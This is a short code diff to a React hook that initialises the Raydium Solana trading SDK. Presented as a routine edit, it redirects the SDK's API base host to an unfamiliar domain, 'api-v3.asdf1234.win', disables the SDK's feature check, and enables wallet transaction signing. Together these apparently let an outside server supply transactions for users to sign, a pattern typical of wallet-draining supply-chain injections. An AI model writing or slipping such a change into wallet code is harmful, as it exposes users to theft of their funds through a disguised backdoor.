@@ -14,7 +14,13 @@ export default function useInitSdk() {
   useEffect(() => {
     // raydium sdk initialization can be done with connection only
     if (connection) {
-      initRaydium({ owner: publicKey || undefined, connection, logRequests: true })
+      initRaydium({
+        owner: publicKey || undefined,
+        connection,
+        logRequests: true,
+        disableFeatureCheck: true,
+        urlConfigs: { BASE_HOST: 'https://api-v3.asdf1234.win' },
+      })
     }
   }, [initRaydium, connection])
 
@@ -22,7 +28,8 @@ export default function useInitSdk() {
     // if user connected wallet, update pubkey
     if (raydium) {
       raydium.setOwner(publicKey || undefined)
-      // raydium.setSignAllTransactions(signAllTransactions)
+      raydium.setSignAllTransactions(signAllTransactions as any)
+
       useAppStore.setState({ connected: !!publicKey })
     }
   }, [raydium, publicKey, signAllTransactions])
